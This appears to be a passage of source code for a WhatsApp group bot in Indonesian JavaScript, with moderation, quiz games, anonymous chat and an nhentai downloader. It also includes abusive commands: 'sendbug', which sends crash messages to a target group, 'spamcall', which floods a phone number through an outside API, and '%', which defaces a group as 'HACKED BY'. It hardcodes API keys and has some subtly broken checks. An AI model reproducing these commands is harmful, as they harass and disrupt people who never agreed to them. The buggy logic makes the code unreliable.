const isQuotedemage = isQuotedMsg ? (quotedMsg.type === 'imageMessage') ? true : false : false
const isQuotediudio = isQuotedMsg ? (quotedMsg.type === 'audioMessage') ? true : false : false
const isQuotedoideo = isQuotedMsg ? (quotedMsg.type === 'videoMessage') ? true : false : false
const isQuotedpticker = isQuotedMsg ? (quotedMsg.type === 'stickerMessage') ? true : false : false
///////// < Anti link > /////////

const createSerial = (size) => {
  return crypto.randomBytes(size).toString('hex').slice(0, size)
}
if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
  if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
 reply(`*「 GROUP LINK DETECTOR 」*\n\n karena kamu melanggar aturan group, yaitu menggirim link group kamu akan di kick dari group!`)
 kahfzz.groupRemove(from, [sender])
  }
  }
              if (budy.includes("https://youtu.be/")) {
if (!isGroup) return
if (!isAntiLinkYT) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK YOUTUBE DETECTOR 」*\nKamu mengirim link yt. kamu ku kick yah:(`)
setTimeout(() => {
kahfzz.groupRemove(from, [kic]).catch((e) => { reply(`Bot Harus Jadi Admin`) })
}, 0)
      }
                  if (budy.includes("๑๑๑๑๑๑๑๑","ผิดุท้่เึางืผิดุท้่เึาง","৭৭৭৭৭৭৭৭","๒๒๒๒๒๒๒๒","*999999")) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP VIRTEX DETECTOR 」*\nKamu mengirim VIRUS VIRTEX. kamu ku kick yah:(`)
setTimeout(() => {
kahfzz.groupRemove(from, [kic]).catch((e) => { reply(`Bot Harus Jadi Admin`) })
}, 0)
      }
             if (budy.includes("#izinmin")) {
if (!isGroup) return
if (!isAntiBocil) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP BOCIL DETECTOR 」*\nKamu Bocil. kamu ku kick yah:(`)
setTimeout(() => {
kahfzz.groupRemove(from, [kic]).catch((e) => { reply(`Bot Harus Jadi Admin`) })
}, 0)
      }
if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json') && isGroup) {
  if (budy.toLowerCase() === "vote") {
 var vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
 var _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
 var fil = vote.map((v) => v.participant);
 if (fil.includes(sender)) {
return mentions(
  "@" + sender.split("@")[0] + " Anda sudah vote",
  fil,
  true
  );
 } else {
vote.push({
  participant: sender,
  voting: "✅",
  voted: sender
});
fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
let _p = [];
let _vote =
"*Vote* " +
"@" +
_votes[0].votes.split("@")[0] +
`\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
for (let i = 0; i < vote.length; i++) {
  _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
 vote[i].voting
  }\n\n`;
  _p.push(vote[i].participant);
}
_p.push(_votes[0].votes);
mentions(_vote, _p, true);
 }
  } else if (budy.toLowerCase() === "devote") {
 var vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
 var _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
 var fil = vote.map((v) => v.participant);
 if (fil.includes(sender)) {
return mentions(
  "@" + sender.split("@")[0] + " Anda sudah vote",
  fil,
  true
  );
 } else {
vote.push({
  participant: sender,
  voting: "❌",
  devote: sender
});
fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
let _p = [];
let _vote =
"*Vote* " +
"@" +
_votes[0].votes.split("@")[0] +
`\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
for (let i = 0; i < vote.length; i++) {
  _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
 vote[i].voting
  }\n\n`;
  _p.push(vote[i].participant);
}
_p.push(_votes[0].votes);
mentions(_vote, _p, true);
 }
  }
}
/** end vote **/

if (isGroup && isAntiviewonce && type == "viewOnceMessage") {
  kahfzz.sendMessage(from, `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`, text, {quoted: kahfz, contextInfo: { mentionedJid: [sender]}});
  var msg = { ...kahfz };
  msg.kahfz = kahfz.message.viewOnceMessage.message;
  msg.kahfz[Object.keys(msg.kahfz)[0]].viewOnce = false;
  kahfzz.copyNForward(from, msg);
}

 // Badword
 if (isGroup && isBadword && !isOwner && !isGroupAdmins && !fromMe){
for (let kasar of badword){
  if (chats.toLowerCase().includes(kasar)){
 if (isCountKasar(sender, senbadword)){
if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
  reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
kahfzz.groupRemove(from, [sender])
delCountKasar(sender, senbadword)
 } else {
addCountKasar(sender, senbadword)
reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
 }
  }
}
 }
 if (isGroup && isBaileys) {
if (mentioned.length >= groupMembers.length){
  if (!chats.match(/(@)/gi)) {
 mentions(`Terdeteksi @${sender.split('@')[0]} melakukan hidetag`, [sender], false)
  }
}
 }
  //// kontol 
  async function uptotele(path){
 var linknya = await tele.uploadByBuffer(fs.readFileSync(path))
 return linknya.link
  }
////////< Sewa > ////////
_sewa.expiredCheck(kahfzz, sewa)
/*Fake Fake an */
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `ꪶ ཻུ۪۪ꦽꦼ̷⸙KahfzBotꪶ ཻུ۪۪ꦽꦼ̷⸙`, 
                            orderTitle: `ꪶ ཻུ۪۪ꦽꦼ̷⸙KahfzBotꪶ ཻུ۪۪ꦽꦼ̷⸙`,
                            thumbnail: 'media/Menu.jpg', 
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
        
///////< MUTE > /////////
if (isMuted){
  if (!isGroupAdmins && !isPremium) return
}
const getWin = (userId) => {
  let position = false
  Object.keys(_win).forEach((i) => {
 if (_win[i].jid === userId) {
position = i
 }
  })
  if (position !== false) {
 return _win[position].win
  }
}
// GAME 
game.cekWaktuFam(kahfzz, family100)
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebakgambar[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var http = randomNomor(100)
 atm.addKoinUser(sender, http, _uang)
 await reply(`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
 delete tebakgambar[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
  }
}
if (game.isfam(from, family100)) {
  var anjuy = game.getjawaban100(from, family100)
  for (let i of anjuy){
 if (budy.toLowerCase().includes(i)){
var htgmp = Math.floor(Math.random() * 20) + 1
atm.addKoinUser(sender, htgmp, _uang)
await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
var anug = anjuy.indexOf(i)
anjuy.splice(anug, 1)
 }
  }
  if (anjuy.length < 1){
 kahfzz.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
 family100.splice(game.getfamposi(from, family100), 1)
  }
}
if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebakanime[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgmu = randomNomor(100)
 atm.addKoinUser(sender, htgmu, _uang)
 await reply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
 delete tebakanime[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
  }
}
if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebaklagu[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htpl = randomNomor(100)
 atm.addKoinUser(sender, htpl, _uang)
 await reply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
 delete tebaklagu[sender.split('@')[0]]
 fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
  }
}
if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebaktebakan[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htpu = randomNomor(100)
 atm.addKoinUser(sender, htpu, _uang)
 await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
 delete tebaktebakan[sender.split('@')[0]]
 fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
  }
}
if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = kuismath[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htcc = randomNomor(100)
 atm.addKoinUser(sender, htcc, _uang)
 await reply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
 delete kuismath[sender.split('@')[0]]
 fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))

  }  
}
if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = asahotak[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgm = randomNomor(100)
 atm.addKoinUser(sender, htgm, _uang)
 await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
 delete asahotak[sender.split('@')[0]]
 fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
  }
}
if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = caklontong[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgmi = randomNomor(100)
 atm.addKoinUser(sender, htgmi, _uang)
 await reply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
 delete caklontong[sender.split('@')[0]]
 fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
  }
}
if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebakjenaka[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgmuu = randomNomor(100)
 atm.addKoinUser(sender, htgmuu, _uang)
 await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
 delete tebakjenaka[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
  }
}
if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebaklirik[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgmii = randomNomor(100)
 atm.addKoinUser(sender, htgmii, _uang)
 await reply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
 delete tebaklirik[sender.split('@')[0]]
 fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
  }
}
if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebakimia[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgmcc = randomNomor(100)
 atm.addKoinUser(sender, htgmcc, _uang)
 await reply(`*_🎮 Tebak Kimia ??_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
 delete tebakimia[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
  }
}
if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebaksiapaaku[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htgmk = randomNomor(100)
 atm.addKoinUser(sender, htgmk, _uang)
 await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
 delete tebaksiapaaku[sender.split('@')[0]]
 fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
  }
}
if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebakbendera[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var html = randomNomor(100)
 atm.addKoinUser(sender, html, _uang)
 await reply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
 delete tebakbendera[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
  }
}
if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = susunkata[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htmp = randomNomor(100)
 atm.addKoinUser(sender, htmp, _uang)
 await reply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
 delete susunkata[sender.split('@')[0]]
 fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
  }
}
if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
  kuis = true
  jawaban = tebakata[sender.split('@')[0]]
  if (budy.toLowerCase() == jawaban) {
 var htmu = randomNomor(100)
 atm.addKoinUser(sender, htmu, _uang)
 await reply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
 delete tebakata[sender.split('@')[0]]
 fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
  }
}
const sendStickerUrl = async(to, url) => {
  console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
  var names = getRandom('.webp')
  var namea = getRandom('.png')
  var download = function (uri, filename, callback) {
 request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
 });
  };
  download(url, namea, async function () {
 let filess = namea
 let asw = names
 require('./lib/exif.js')
 exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
  let media = fs.readFileSync(asw)
  kahfzz.sendMessage(to, media, sticker)
  console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
});
 });
  });
}
////////// level nye
let Levelnye = level.getLevelingLevel(sender, _level)
let Xpluu = level.getLevelingXp(sender, _level)
let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
tc = `MAAF KA NOMER KAMU BLOM TERDAFTAR DI DATABASE SILAHKAN KETIK !verify UNTUK MENDAFTAR DI KAHFZ BOTZ`
ind = {
  wait: `⌛ Sedang di Prosess ⌛`,
  success: `✔️ Berhasil ✔️`,
}
///// < lanjut massss > ////
let ikyads = await getBuffer(`${ppbot}`)
fakelink = (tekslink) => { 
  return {"externalAdReply": { "title": tekslink, "thumbnail": ikyads, "sourceUrl": "https://wa.me/qr/UCVMNO2VLMDBK1" }}
}
let ikyadd = await getBuffer(`${infouser}`)
fakelink = (tekslink) => { 
  return {"externalAdReply": { "title": tekslink, "thumbnail": ikyadd, "sourceUrl": "https://wa.me/qr/UCVMNO2VLMDBK1" }}
}
// AFK
if (isGroup) {
  for (let x of mentionUser) {
 if (afk.checkAfkUser(x, _afk)) {
const getId = afk.getAfkId(x, _afk)
const getReason = afk.getAfkReason(getId, _afk)
const getTime = afk.getAfkTime(getId, _afk)
const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
mentions(cptl, x, true)
 }}
 if (afk.checkAfkUser(sender, _afk) && !isCmd) {
const getTime = afk.getAfkTime(sender, _afk)
const getReason = afk.getAfkReason(sender, _afk)
const ittung = ms(await Date.now() - getTime)
const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
reply(pep)
_afk.splice(afk.getAfkPosition(sender, _afk), 1)
fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
 }
  }

  if (!isCmd && from.endsWith('@s.whatsapp.net')) {
 kahfzz.anonymous = kahfzz.anonymous ? kahfzz.anonymous: {}
 let room = Object.values(kahfzz.anonymous).find(room => [room.a, room.b].includes(sender) && room.state === 'CHATTING')
 if (room) {
if (/^.*(next|leave|start)/.test(body)) return
  if ([`${prefix}next`, `${prefix}leave`, `${prefix}start`, 'Cari Partner', 'Keluar', 'Next'].includes(body)) return
 let other = [room.a,
  room.b].find(user => user !== sender)
  if (type === "conversation") {
 kahfzz.sendMessage(other, kahfz.message.conversation, text);
  } else {
 kahfzz.sendMessageFromContent(other, kahfz.message)
  }
}
 }

 const ByReply = type == "extendedTextMessage" && kahfz.message.extendedTextMessage.contextInfo != null ? kahfz.message.extendedTextMessage.contextInfo.stanzaId || "": ""
 const typeImage = ByReply ? ByReply.startsWith('IMAGE'): false
 const typePdf = ByReply ? ByReply.startsWith('PDF'): false
 const nhSearch = ByReply ? ByReply.startsWith("CARI") : false
 const finish = ByReply ? ByReply.startsWith("FINISH") : false

 if (!isCmd && typePdf) {
if (ByReply.match(/^[0-9]/)) return reply("Reply with number!")
  reply("Wait a moment, the data is being processed")
var a = await axios.get(`https://api.lolhuman.xyz/api/nhentai/${budy}?apikey=IkyChan`)
var capt = `• Title : ${a.data.result.title_romaji}\n\n`
for (let i in a.data.result.info) {
  capt += `• ${i} : ${a.data.result.info[i].toString()}\n\n`
}
await kahfzz.sendMessage(from, {
  url: a.data.result.image[0]}, image, {
 caption: capt, quoted: kahfz })

var pdf = await axios.get(`https://api.lolhuman.xyz/api/nhentaipdf/${budy}?apikey=IkyChan`)
kahfzz.sendMessage(from, {url: pdf.data.result}, document, {
  thumbnail: await getBuffer(a.data.result.image[0]), quoted: kahfz, filename: a.data.result.title_romaji, mimetype: "application/pdf"
})


 } else if (!isCmd && typeImage) {
if (body.match(/^[0-9]/)) return reply("Reply with number!")
  reply("Wait a moment, the data is being processed")
var a = await axios.get(`https://api.lolhuman.xyz/api/nhentai/${budy}?apikey=IkyChan`)
for (let i of a.data.result.image) {
  kahfzz.sendMessage(from, {url: i}, image, {thumbnail: Buffer.alloc(0)})
  await sleep(600)
}
 } else if (!isCmd && nhSearch) {
reply (`Wait, i searching nhentai code for you`)
var a = await axios.get(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=IkyChan&query=${budy}`)
teks = `*THIS RESULT FOR YOU*\n\nTo get result reply this message with the code below\n\nExample : 212121\n\n`
b = a.data.result
for (let c of b) {
  for (let i in c) {
 teks += `• ${i} :  ${c[i].toString()}\n\n`
  }
}
kahfzz.sendMessage(from, teks, "conversation", {
  quoted: kahfz, messageId: "PDF"+createSerial(8)})
 }


// Auto Read
        kahfzz.chatRead(from, "read")
        //AUTO VN
await kahfzz.updatePresence(from, Presence.recording)
//// CMD
if (isCmd && !isGroup)
  atm.addKoinUser(sender, randomNomor(20), _uang)
console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
if (isCmd && isGroup)
  atm.addKoinUser(sender, randomNomor(20), _uang)
console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
//////// < lanjut mas > ////////////
if (budy.toLowerCase() === `8473`){
  if (isRegister) return 
 register.push(sender)
  fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
  teks = `Verification success\n\nPlease send *!menu* to view menu`
  atm.addKoinUser(sender, randomNomor(100), _uang)
  kahfzz.sendMessage(from, teks, text, {quoted: freply })
}
if (!kahfz.key.fromMe && banChats === false) return
  switch (command) {
case '%':
if (!isGroup) return reply(mess.only.group)
 if (args.length < 1) return reply('Teksnya?')
reply('Otw Kudeta')
 tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
 kahfzz.updateProfilePicture (from, tessgc)
 await sleep(1000)
 kahfzz.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
 await sleep(1000)
 kahfzz.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)
 await sleep(1000)
 kahfzz.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
 break
 case 'sendbug':

 if (args.length < 1) return reply(`Penggunaan ${command} idgroup`)
kahfzz.sendBugGC(args[1], WA_DEFAULT_EPHEMERAL)
 kahfzz.sendBugGC(args[1], 0)
 kahfzz.sendBugGC(args[1], 999)
 textImg('done owner')
 break
 case "typepdf":
 kahfzz.sendMessage(from, "Reply this text with nhentai code\n\nNote : Reply this text only with number!", text, {quoted: kahfz, messageId: "PDF"+createSerial(8)})
 break
 case "nocode":
 kahfzz.sendMessage(from, "Reply this text with nhentai gotoubun example title\n\nNote : Reply this text !", text, {quoted: kahfz, messageId: "NOCODE"+createSerial(8)})
 break
 case "cadangan":
 kahfzz.sendMessage(from, "Reply this message with query\n\nExample : Gotoubun", text, {quoted: kahfz, messageId: "CARI"+createSerial(8)})
 break
 case "typeimage":
 kahfzz.sendMessage(from, "Reply this text with nhentai code\n\nNote : Reply this text only with number!", text, {quoted: kahfz, messageId: "IMAGE"+createSerial(8)})
 break
 case "nhentai1":
 buttons = [{buttonId: noprefix ? "typepdf" : "!"+"typepdf",buttonText:{displayText: 'PDF'},type:1},{buttonId:noprefix ? "typeimage" : "!"+"typeimage", buttonText:{displayText:'IMAGE'},type:1}]
 buttonsMessage = {
contentText: `Choose your type, your want i send image or pdf?`,
footerText: 'Nhentai Downloader',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
 case "nhentai":
 buttons = [{buttonId: noprefix ? "cadangan" : "!"+"cadangan",buttonText:{displayText: 'NO'},type:1},{buttonId:noprefix ? "nhentai1" : "!"+"nhentai1", buttonText:{displayText:'YES'},type:1}]
 buttonsMessage = {
contentText: `Do you have the code or not?`,
footerText: 'Nhentai Downloader',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
 case 'owner': case 'creator':
 sendKontak(from, `${owner}`, `${ownerName}`, 'Sc Gratis 😱')
 await sleep(1000)
 txtt =`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`

 buttons = [{buttonId: noprefix ? "sou" : "!"+"sourcecode",buttonText:{displayText: 'SC BOT'},type:1},{buttonId:noprefix ? "infoig" : "!"+"infoig", buttonText:{displayText:'INSTAGRAM'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Sungkan Chat Ya Kak',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break
 case 'spamcall':{
if (!isPremium) return reply(mess.OnlyPrem)
  if (args.length > 1) return reply(`Cara penggunaan : ${command} no hp`)
 if (isNaN(args[1]) && args[1].startsWith('62')) return reply(`Harus berupa angka dan pastikan tidak memasukkan kode negara, contoh: ${command} 8127668234`)
fetchJson(`https://api.zeks.xyz/api/spamcall?apikey=chika-key&no=${args[1]}`)
 .then((data) => {
textImg(data.result.logs)
 })
 .catch((err) => {
sendMess(ownerNumber, `${command} Error:` + err)
reply(mess.error.api)
 })
  }
  break
  case 'next': case 'leave': case "stop": {
 if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
kahfzz.anonymous = kahfzz.anonymous ? kahfzz.anonymous: {}
 let room = Object.values(kahfzz.anonymous).find(room => room.check(sender))
 if (!room) {
await kahfzz.sendButton(from, '_Kamu tidak sedang berada di anonymous chat_', `${kahfzz.user.name}`, 'Cari Partner', prefix+'start')
return false
 }
 reply('_You stopped matchmaking_')
 let other = room.other(sender)
 if (other) await kahfzz.sendButton(other, '_Partner meninggalkan chat_', `${kahfzz.user.name}`, 'Cari Partner', prefix+'start')
delete kahfzz.anonymous[room.id]
 if (command === 'leave' || command === "stop") break
  }

case 'mulai': case 'start': case "anonymous": case "mutual": {
  if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
 kahfzz.anonymous = kahfzz.anonymous ? kahfzz.anonymous: {}
  if (Object.values(kahfzz.anonymous).find(room => room.check(sender))) {
 await kahfzz.sendButton(from, '_Kamu masih berada di dalam anonymous chat, menunggu partner_', `${kahfzz.user.name}`, 'Keluar', `${prefix}leave`)
 return false
  }
  let room = Object.values(kahfzz.anonymous).find(room => room.state === 'WAITING' && !room.check(sender))
  if (room) {
 await kahfzz.sendButton(room.a, '_Partner ditemukan!_', `${kahfzz.user.name}`, 'Next', prefix+'next')
 room.b = sender
 room.state = 'CHATTING'
 await kahfzz.sendButton(room.b, '_Partner ditemukan!_', `${kahfzz.user.name}`, 'Next', prefix+'next')
  } else {
 let id = + new Date
 kahfzz.anonymous[id] = {
id,
a: sender,
b: '',
state: 'WAITING',
check: function (who = '') {
  return [this.a,
  this.b].includes(who)
},
other: function (who = '') {
  return who === this.a ? this.b: who === this.b ? this.a: ''
},
 }
 await kahfzz.sendButton(from, '_Menunggu partner..._', `${kahfzz.user.name}`, 'Keluar', prefix+'leave')
  }
  break
}
case 'bucinstick':
case'bucinsticker':{

  var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
  var wifegerak = ano.split('\n')
  var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
  var isGif = wifegerakx.endsWith('.gif') ? true : false
  if (!isGif) {
 var ngebuff = await getBuffer(wifegerakx)
 var media = getRandom('.png')
 fs.writeFileSync(media, ngebuff)
 await ffmpeg(`${media}`)
 .input(media)
 .on('start', function (cmd) {
console.log(`Started : ${cmd}`)
 })
 .on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.api)
 })
 .on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
  if (error) return reply(mess.error.api)
kahfzz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})

 fs.unlinkSync(media)	
 fs.unlinkSync(`./sticker/${sender}.webp`)	
  })
 })
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(`./sticker/${sender}.webp`)
  } else {
var ngebuff = await getBuffer(wifegerakx)
let media = `./sticker/${sender}.gif`
fs.writeFileSync(media, ngebuff)
reply(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
 console.log(`Started : ${cmd}`)
  })
.on('error', function (err) {
 console.log(err)
 fs.unlinkSync(media)
 let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
 reply(mess.error.api)
  })
.on('end', function () {
 console.log('Finish')
 exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
  if (error) return reply(mess.error.api)
 kahfzz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})

  fs.unlinkSync(media)
  fs.unlinkSync(`./sticker/${sender}.webp`)
})
  })
